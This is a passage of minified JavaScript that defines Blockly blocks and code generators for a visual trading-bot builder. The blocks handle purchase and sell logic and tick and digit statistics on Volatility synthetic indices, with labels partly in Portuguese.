  var lh = "func$1$9$8$7$RunOnceAtStart=()=>{izinRun2=false;" + lg + ";stakeNow=getStakeBegin();sudahRunOnceAtStart=true;timeMayOP=Date.now()+600;}";
  return lh;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchaseconditions",
  message0: "%1 2. Lógica de Compra %2 %3",
  args0: [{
    type: "field_image",
    src: "https://pontobots.com/image/icon_purchase.png",
    width: 25,
    height: 25,
    alt: "*",
    flipRtl: false
  }, {
    type: "input_end_row"
  }, {
    type: "input_statement",
    name: "statement_purchaseconditions"
  }],
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchaseconditions = function (li, lj) {
  var lk = lj.statementToCode(li, "statement_purchaseconditions");
  var ll = "func$1$9$8$7$PurchaseConditions=()=>{if(izinRun2){izinRun2=false;" + lk + "};}";
  return ll;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchaseconditions_continuousindices",
  message0: "%1 2. Lógica de Compra - Sistema Intermercados %2 %3",
  args0: [{
    type: "field_image",
    src: "https://pontobots.com/image/icon_purchase.png",
    width: 25,
    height: 25,
    alt: "*",
    flipRtl: false
  }, {
    type: "input_end_row"
  }, {
    type: "input_statement",
    name: "statement_purchaseconditions"
  }],
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchaseconditions_continuousindices = function (lm, ln) {
  var lo = ln.statementToCode(lm, "statement_purchaseconditions");
  var lp = "func$1$9$8$7$PurchaseConditions_continuousindices=()=>{" + lo + "}";
  return lp;
};
Blockly.defineBlocksWithJsonArray([{
  type: "currentmarket_continuousindices",
  message0: "Mercado Atual - Sistema Intermercados",
  args0: [],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.currentmarket_continuousindices = function (lq, lr) {
  var ls = "mainMarket_continuousindices";
  return [ls, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "1001tickslist_continuousindices",
  message0: "1001 Ticks List - Sistema Intermercados",
  args0: [],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock["1001tickslist_continuousindices"] = function (lt, lu) {
  var lv = "mainTickArray_continuousindices";
  return [lv, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "1001lastdigitlist_continuousindices",
  message0: "1001 Last Digit List - Sistema Intermercados",
  args0: [],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock["1001lastdigitlist_continuousindices"] = function (lw, lx) {
  var ly = "mainDigitArray_continuousindices";
  return [ly, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "setactive_continuousindices",
  message0: "Ativar Mercado - Sistema Intermercados %1 %2 #1. Volatility 10(1s) Index %3 %4 #2. Volatility 25(1s) Index %5 %6 #3. Volatility 50(1s) Index %7 %8 #4. Volatility 75(1s) Index %9 %10 #5. Volatility 100(1s) Index %11 %12 #6. Volatility 10 Index %13 %14 #7. Volatility 25 Index %15 %16 #8. Volatility 50 Index %17 %18 #9. Volatility 75 Index %19 %20 #10. Volatility 100 Index",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market1_nya",
    checked: true
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market2_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market3_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market4_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market5_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market6_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market7_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market8_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market9_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market10_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setactive_continuousindices = function (lz, ma) {
  for (var mb = 1; mb <= 10; mb++) {
    checkbox_check_market_nya[mb] = lz.getFieldValue("check_market" + mb + "_nya") === "TRUE";
  }
  var mc = "for(var m=1;m<=10;m++){if(continuousindices_active[m].checked!=checkbox_check_market_nya[m]){continuousindices_active[m].checked=checkbox_check_market_nya[m];continuousindices_activeChanged(m,checkbox_check_market_nya[m]);}};";
  return mc;
};
Blockly.defineBlocksWithJsonArray([{
  type: "continuousindices",
  message0: "Índices Intermercados: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_continuousindices_A",
    options: [["#1. Volatility 10(1s) Index", "1"], ["#2. Volatility 25(1s) Index", "2"], ["#3. Volatility 50(1s) Index", "3"], ["#4. Volatility 75(1s) Index", "4"], ["#5. Volatility 100(1s) Index", "5"], ["#6. Volatility 10 Index", "6"], ["#7. Volatility 25 Index", "7"], ["#8. Volatility 50 Index", "8"], ["#9. Volatility 75 Index", "9"], ["#10. Volatility 100 Index", "10"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_continuousindices_B",
    options: [["1001 Ticks List", "ticks"], ["1001 Last Digit List", "digits"], ["Symbol", "symbol"]]
  }],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.continuousindices = function (md, me) {
  var mf = md.getFieldValue("dropdown_continuousindices_A");
  var mg = md.getFieldValue("dropdown_continuousindices_B");
  var mh;
  if (mg == "symbol") {
    mh = "document.getElementById(\"continuousindices_" + mf + "_" + mg + "\").innerText";
  } else {
    mh = "(document.getElementById(\"continuousindices_" + mf + "_active\").checked)?document.getElementById(\"continuousindices_" + mf + "_" + mg + "\").value:\"\"";
  }
  return [mh, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "sellconditions",
  message0: "%1 3. Condições de Venda (Sell) %2 %3",
  args0: [{
    type: "field_image",
    src: "https://pontobots.com/image/icon_dollarsack.png",
    width: 25,
    height: 25,
    alt: "*",
    flipRtl: false
  }, {
    type: "input_end_row"
  }, {
    type: "input_statement",
    name: "statement_sellconditions"
  }],
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.sellconditions = function (mi, mj) {
  var mk = mj.statementToCode(mi, "statement_sellconditions");
  var ml = "func$1$9$8$7$SellConditions=()=>{" + mk + "}";
  return ml;
};
Blockly.defineBlocksWithJsonArray([{
  type: "sellisavailable",
  message0: "Sell is available",
  args0: [],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.sellisavailable = function (mm, mn) {
  var mo = "(isContractValidToSell[sedangPantauContractPos]==1)?true:false";
  return [mo, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "sellprofitloss",
  message0: "Sell profit/loss",
  args0: [],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.sellprofitloss = function (mp, mq) {
  var mr = "sellProfitLoss[sedangPantauContractPos]";
  return [mr, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "sellatmarket",
  message0: "Sell at market",
  args0: [],
  previousStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.sellatmarket = function (ms, mt) {
  var mu = "funcSellAtMarket();";
  return mu;
};
Blockly.defineBlocksWithJsonArray([{
  type: "restarttradingconditions",
  message0: "%1 4. Lógica de Recompra %2 %3",
  args0: [{
    type: "field_image",
    src: "https://pontobots.com/image/icon_finish.png",
    width: 25,
    height: 25,
    alt: "*",
    flipRtl: false
  }, {
    type: "input_end_row"
  }, {
    type: "input_statement",
    name: "statement_restarttradingconditions"
  }],
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.restarttradingconditions = function (mv, mw) {
  var mx = mw.statementToCode(mv, "statement_restarttradingconditions");
  var my = "func$1$9$8$7$RestartTradingConditions=()=>{" + mx + "}";
  return my;
};
Blockly.defineBlocksWithJsonArray([{
  type: "lastcontractdetail",
  message0: "Detalhes do último contrato: %1",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_lastcontractdetail_A",
    options: [["Ask price", "askprice"], ["Payout", "payout"], ["Profit", "profit"], ["Contract type", "contracttype"], ["Entry time", "entrytime"], ["Entry value", "entryvalue"], ["Entry value string", "entryvaluestring"], ["Exit time", "exittime"], ["Exit value", "exitvalue"], ["Exit value string", "exitvaluestring"], ["Barrier", "barrier"], ["Result", "result"]]
  }],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.lastcontractdetail = function (mz, na) {
  var nb = mz.getFieldValue("dropdown_lastcontractdetail_A");
  var nd = "lastCont_" + nb;
  if (["askprice", "payout", "profit", "entryvalue", "exitvalue"].includes(nb)) {
    nd += "*1";
  }
  return [nd, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "lastdigit",
  message0: "Último Dígito",
  args0: [],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.lastdigit = function (ne, nf) {
  var ng = "digitArrayUtama.at(-1)*1";
  return [ng, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "1001lastdigitlist",
  message0: "1001 Last Digit List",
  args0: [],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock["1001lastdigitlist"] = function (nh, ni) {
  var nj = "digitArrayUtama";
  return [nj, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "thelast10digits",
  message0: "Last 10 digits: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_thelast10digits_A",
    options: [["Digit", "digit"], ["Tick move", "tickmove"], ["Change", "change"], ["Digit move", "digitmove"], ["Digit caterzian", "digitgraph"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_thelast10digits_B",
    options: [["List", "list"], ["10th", "10"], ["9th", "9"], ["8th", "8"], ["7th", "7"], ["6th", "6"], ["5th", "5"], ["4th", "4"], ["3rd", "3"], ["2nd", "2"], ["1st", "1"]]
  }],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.thelast10digits = function (nk, nl) {
  var nm = nk.getFieldValue("dropdown_thelast10digits_A");
  var nn = nk.getFieldValue("dropdown_thelast10digits_B");
  var np;
  if (nn == "list") {
    np = "thelast10digits_" + nm + "_list";
  } else {
    np = "document.getElementById(\"thelast10digits_" + nm + "_" + nn + "\").innerText";
    if (["digit", "change", "digitgraph"].includes(nm)) {
      np += "*1";
    }
  }
  return [np, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "digitstatisticsetnoofticks",
  message0: "Digit statistic | Set %1 : %2 ticks",
  args0: [{
    type: "field_dropdown",
    name: "row_nya",
    options: [["Row#1", "1"], ["Row#2", "2"], ["Row#3", "3"], ["Row#4", "4"], ["Row#5", "5"], ["Row#6", "6"]]
  }, {
    type: "input_value",
    name: "ticks_nya"
  }],
  inputsInline: true,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.digitstatisticsetnoofticks = function (nq, nr) {
  var ns = nq.getFieldValue("row_nya");
  var nt = nr.valueToCode(nq, "ticks_nya", javascript.Order.ATOMIC);
  var nu = "digitstatistic_noofticks[" + ns + "].value=" + nt + "*1;";
  return nu;
};
Blockly.defineBlocksWithJsonArray([{
  type: "digitstatistic",
  message0: "Digit statistic: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_digitstatistic_A",
    options: [["Row#1", "1"], ["Row#2", "2"], ["Row#3", "3"], ["Row#4", "4"], ["Row#5", "5"], ["Row#6", "6"], ["Summary", "summ"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_digitstatistic_B",
    options: [["List", "list"], ["Digit 0", "0"], ["Digit 1", "1"], ["Digit 2", "2"], ["Digit 3", "3"], ["Digit 4", "4"], ["Digit 5", "5"], ["Digit 6", "6"], ["Digit 7", "7"], ["Digit 8", "8"], ["Digit 9", "9"], ["Least", "least"], ["Most", "most"]]
  }],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.digitstatistic = function (nv, nw) {
  var nx = nv.getFieldValue("dropdown_digitstatistic_A");
  var ny = nv.getFieldValue("dropdown_digitstatistic_B");
  var nz;
  if (ny == "list") {
    if (nx == "summ") {
      nz = "digitstatistic_list[7]";
    } else {
      nz = "digitstatistic_list[" + nx + "]";
    }
  } else {
    nz = "document.getElementById(\"digitstatistic_" + nx + "_" + ny + "\").innerText";
    if (["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(ny)) {
      nz += "*1";
    }
  }
  return [nz, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "caterzian20",
  message0: "Caterzianos 20: %1",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_caterzian20_B",
    options: [["List", "list"], ["20th", "20"], ["19th", "19"], ["18th", "18"], ["17th", "17"], ["16th", "16"], ["15th", "15"], ["14th", "14"], ["13th", "13"], ["12th", "12"], ["11th", "11"], ["10th", "10"], ["9th", "9"], ["8th", "8"], ["7th", "7"], ["6th", "6"], ["5th", "5"], ["4th", "4"], ["3rd", "3"], ["2nd", "2"], ["1st", "1"]]
  }],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.caterzian20 = function (oa, ob) {
  var oc = oa.getFieldValue("dropdown_caterzian20_B");
  var od;
  if (oc == "list") {
    od = "thelast20digits_digitcater_list";
  } else {
    od = "document.getElementById(\"thelast20digits_digitcater_" + oc + "\").innerText*1";
  }
  return [od, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "evenodd20",
  message0: "Even / Odd 20: %1",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_evenodd20_B",
    options: [["List", "list"], ["20th", "20"], ["19th", "19"], ["18th", "18"], ["17th", "17"], ["16th", "16"], ["15th", "15"], ["14th", "14"], ["13th", "13"], ["12th", "12"], ["11th", "11"], ["10th", "10"], ["9th", "9"], ["8th", "8"], ["7th", "7"], ["6th", "6"], ["5th", "5"], ["4th", "4"], ["3rd", "3"], ["2nd", "2"], ["1st", "1"]]
  }],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.evenodd20 = function (oe, og) {
  var oh = oe.getFieldValue("dropdown_evenodd20_B");
  var oi;
  if (oh == "list") {
    oi = "thelast20digits_digitevenodd_list";
  } else {
    oi = "document.getElementById(\"thelast20digits_digitevenodd_" + oh + "\").innerText";
  }
  return [oi, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "evenvsoddsetnoofticks",
  message0: "Even VS Odd | Set %1 : %2 ticks",
  args0: [{
    type: "field_dropdown",
    name: "row_nya",
    options: [["Row#1", "1"], ["Row#2", "2"], ["Row#3", "3"], ["Row#4", "4"], ["Row#5", "5"], ["Row#6", "6"]]
  }, {
    type: "input_value",
    name: "ticks_nya"
  }],
  inputsInline: true,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.evenvsoddsetnoofticks = function (oj, ol) {
  var om = oj.getFieldValue("row_nya");
  var oo = ol.valueToCode(oj, "ticks_nya", javascript.Order.ATOMIC);
  var op = "evenvsodd_noofticks[" + om + "].value=" + oo + "*1;";
  return op;
};
Blockly.defineBlocksWithJsonArray([{
  type: "evenvsodd",
  message0: "Even VS Odd: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_evenvsodd_A",
    options: [["Row#1", "1"], ["Row#2", "2"], ["Row#3", "3"], ["Row#4", "4"], ["Row#5", "5"], ["Row#6", "6"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_evenvsodd_B",
    options: [["Even(%)", "even"], ["Odd(%)", "odd"]]
  }],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.evenvsodd = function (oq, os) {
  var ot = oq.getFieldValue("dropdown_evenvsodd_A");
  var ou = oq.getFieldValue("dropdown_evenvsodd_B");
  var ov = "document.getElementById(\"evenvsodd_" + ot + "_" + ou + "\").innerText.replaceAll(\"%\",\"\")*1";
  return [ov, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "overvsundersetnoofticks",
  message0: "Over VS Under | Set %1 : %2 ticks",
  args0: [{
    type: "field_dropdown",
    name: "row_nya",
    options: [["Row#1", "1"], ["Row#2", "2"]]
  }, {
    type: "input_value",
    name: "ticks_nya"
  }],
  inputsInline: true,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.overvsundersetnoofticks = function (ow, ox) {
  var oy = ow.getFieldValue("row_nya");
  var oz = ox.valueToCode(ow, "ticks_nya", javascript.Order.ATOMIC);
  var pa = "overvsunder_noofticks[" + oy + "].value=" + oz + "*1;";
  return pa;
};
Blockly.defineBlocksWithJsonArray([{
  type: "overvsundersetdigit",
  message0: "Over VS Under | Set %1 %2 %3",
  args0: [{
    type: "field_dropdown",
    name: "row_nya",
    options: [["Row 1", "1"], ["Row 2", "2"]]
  }, {
    type: "field_dropdown",
    name: "type_nya",
    options: [["Over", "over"], ["Under", "under"]]
  }, {
    type: "input_value",
    name: "digit_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.overvsundersetdigit = function (pb, pc) {
  var pd = pb.getFieldValue("row_nya");
  var pe = pb.getFieldValue("type_nya");
  var pf = pc.valueToCode(pb, "digit_nya", javascript.Order.ATOMIC);
  var pg = "document.getElementById(\"overvsunder_" + pd + "_" + pe + "digit\").value=" + pf + ";";
  return pg;
};
Blockly.defineBlocksWithJsonArray([{
  type: "overvsunder",
  message0: "Over VS Under: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_overvsunder_A",
    options: [["Row#1", "1"], ["Row#2", "2"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_overvsunder_B",
    options: [["Over(%)", "over"], ["Under(%)", "under"]]
  }],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.overvsunder = function (ph, pi) {
  var pj = ph.getFieldValue("dropdown_overvsunder_A");
  var pk = ph.getFieldValue("dropdown_overvsunder_B");
  var pl = "document.getElementById(\"overvsunder_" + pj + "_" + pk + "\").innerText.replaceAll(\"%\",\"\")*1";
  return [pl, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "lasttick",
  message0: "Último Tick",
  args0: [],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.lasttick = function (pm, pn) {
  var po = "tickArrayUtama.at(-1)*1";
  return [po, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "lasttickstring",
  message0: "Último Tick String",
  args0: [],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.lasttickstring = function (pp, pq) {
  var ps = "tickArrayUtamaText.at(-1)";
  return [ps, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "1001tickslist",
  message0: "1001 Ticks List",
  args0: [],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock["1001tickslist"] = function (pt, pu) {
  var pv = "tickArrayUtama";
  return [pv, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "1001ticksstringlist",
  message0: "1001 Ticks String List",
  args0: [],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock["1001ticksstringlist"] = function (pw, py) {
  var pz = "tickArrayUtamaText";
  return [pz, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "thelast10ticks",
  message0: "Last 10 ticks: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_thelast10ticks_A",
    options: [["Tick", "tick"], ["Move", "move"], ["Worm", "worm"], ["Sentiment", "sentiment"], ["Change", "change"], ["%", "%"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_thelast10ticks_B",
    options: [["List", "list"], ["10th", "10"], ["9th", "9"], ["8th", "8"], ["7th", "7"], ["6th", "6"], ["5th", "5"], ["4th", "4"], ["3rd", "3"], ["2nd", "2"], ["1st", "1"]]
  }],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.thelast10ticks = function (qa, qb) {
  var qc = qa.getFieldValue("dropdown_thelast10ticks_A");
  var qd = qa.getFieldValue("dropdown_thelast10ticks_B");
  var qe;
  if (qd == "list") {
    if (qc == "%") {
      qe = "thelast10ticks_changeperc_list";
    } else {
      qe = "thelast10ticks_" + qc + "_list";
    }
  } else {
    qe = "document.getElementById(\"thelast10ticks_" + qc + "_" + qd + "\").innerText";
    if (["tick", "change", "%"].includes(qc)) {
      qe += "*1";
    }
  }
  return [qe, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "tickworm20",
  message0: "Worm 20: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_tickworm20_A",
    options: [["History (worm head)", "history"], ["Current", "current"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_tickworm20_B",
    options: [["List", "list"], ["20th", "20"], ["19th", "19"], ["18th", "18"], ["17th", "17"], ["16th", "16"], ["15th", "15"], ["14th", "14"], ["13th", "13"], ["12th", "12"], ["11th", "11"], ["10th", "10"], ["9th", "9"], ["8th", "8"], ["7th", "7"], ["6th", "6"], ["5th", "5"], ["4th", "4"], ["3rd", "3"], ["2nd", "2"], ["1st", "1"]]
  }],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.tickworm20 = function (qg, qh) {
  var qi = qg.getFieldValue("dropdown_tickworm20_A");
  var qj = qg.getFieldValue("dropdown_tickworm20_B");
  var qk;
  if (qj == "list") {
    qk = "thelast20tickworm_" + qi + "_list";
  } else {
    qk = "document.getElementById(\"thelast20tickworm_" + qi + "_" + qj + "\").innerText";
  }
  return [qk, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "risevsfallsetnoofticks",
  message0: "Rise VS Fall | Set %1 : %2 ticks",
  args0: [{
    type: "field_dropdown",
    name: "row_nya",
    options: [["Row#1", "1"], ["Row#2", "2"], ["Row#3", "3"], ["Row#4", "4"], ["Row#5", "5"], ["Row#6", "6"]]
  }, {
    type: "input_value",
    name: "ticks_nya"
  }],
  inputsInline: true,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.risevsfallsetnoofticks = function (ql, qm) {
  var qn = ql.getFieldValue("row_nya");
  var qo = qm.valueToCode(ql, "ticks_nya", javascript.Order.ATOMIC);
  var qp = "risevsfall_noofticks[" + qn + "].value=" + qo + "*1;";
  return qp;
};
Blockly.defineBlocksWithJsonArray([{
  type: "risevsfall",
  message0: "Rise VS Fall: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_risevsfall_A",
    options: [["Row#1", "1"], ["Row#2", "2"], ["Row#3", "3"], ["Row#4", "4"], ["Row#5", "5"], ["Row#6", "6"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_risevsfall_B",
    options: [["Rise(%)", "rise"], ["Fall(%)", "fall"]]
  }],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.risevsfall = function (qq, qr) {
  var qs = qq.getFieldValue("dropdown_risevsfall_A");
  var qt = qq.getFieldValue("dropdown_risevsfall_B");
  var qu = "document.getElementById(\"risevsfall_" + qs + "_" + qt + "\").innerText.replaceAll(\"%\",\"\")*1";
  return [qu, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "inpTickTrismasetperiod",
  message0: "Triple SMA ticks | Set period %1 : %2",
  args0: [{
    type: "field_dropdown",
    name: "row_nya",
    options: [["SMA#1", "1"], ["SMA#2", "2"], ["SMA#3", "3"]]
  }, {
    type: "input_value",
    name: "period_nya"
  }],
  inputsInline: true,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.inpTickTrismasetperiod = function (qv, qw) {
  var qx = qv.getFieldValue("row_nya");
  var qy = qw.valueToCode(qv, "period_nya", javascript.Order.ATOMIC);
  var qz = "inpTickTrisma_period[" + qx + "].value=" + qy + "*1;";
  return qz;
};
Blockly.defineBlocksWithJsonArray([{
  type: "ticktrisma",
  message0: "Triple SMA ticks: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_ticktrisma_A",
    options: [["SMA#1", "1"], ["SMA#2", "2"], ["SMA#3", "3"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_ticktrisma_B",
    options: [["List", "list"], ["20th", "20"], ["19th", "19"], ["18th", "18"], ["17th", "17"], ["16th", "16"], ["15th", "15"], ["14th", "14"], ["13th", "13"], ["12th", "12"], ["11th", "11"], ["10th", "10"], ["9th", "9"], ["8th", "8"], ["7th", "7"], ["6th", "6"], ["5th", "5"], ["4th", "4"], ["3rd", "3"], ["2nd", "2"], ["1st", "1"]]
  }],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.ticktrisma = function (ra, rb) {
  var rc = ra.getFieldValue("dropdown_ticktrisma_A");
  var rd = ra.getFieldValue("dropdown_ticktrisma_B");
  var rf;
  if (rd == "list") {
    rf = "tick_sma_list[" + rc + "]";
  } else {
    rf = "document.getElementById(\"tick_sma" + rc + "_" + rd + "\").innerText*1";
  }
  return [rf, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "detail3ticks",
  message0: "Detail 3 ticks: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_detail3ticks_A",
    options: [["1st last tick", "1"], ["2nd last tick", "2"], ["3rd last tick", "3"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_detail3ticks_B",
    options: [["1st", "1"], ["2nd", "2"], ["3rd", "3"], ["4th", "4"], ["5th", "5"], ["6th", "6"], ["7th", "7"], ["8th", "8"], ["9th", "9"], ["10th", "10"], ["11th", "11"], ["12th", "12"]]
  }],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.detail3ticks = function (rg, rh) {
  var ri = rg.getFieldValue("dropdown_detail3ticks_A");
  var rj = rg.getFieldValue("dropdown_detail3ticks_B");
  var rk = "document.getElementById(\"detail3ticks_" + ri + "_" + rj + "\").innerText";
  if (!isNaN(document.getElementById("detail3ticks_" + ri + "_" + rj).innerText)) {
    rk += "*1";
  }
  return [rk, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "getstataccu",
  message0: "Stats do ACCUMULATOR %1 Mercado: %2 %3 Growth Rate % [1-5]: %4 Tick List : %5",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarketAccu
  }, {
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "growthRate_nya"
  }, {
    type: "input_value",
    name: "arrTick_nya",
    check: "Array"
  }],
  inputsInline: false,
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.getstataccu = function (rl, rm) {
  var rn = rl.getFieldValue("market_nya");
  var ro = rn == "activemarket" ? "mainSymbol" : rn == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + rn.split("|")[0] + "\"";
  var rp = rm.valueToCode(rl, "growthRate_nya", javascript.Order.ATOMIC);
  var rq = rm.valueToCode(rl, "arrTick_nya", javascript.Order.ATOMIC);
  var rr = "getStatAccu(" + rq + "," + ro + "," + rp + ")";
  return [rr, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "datetime",
  message0: "Date/Time: %1",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_datetime",
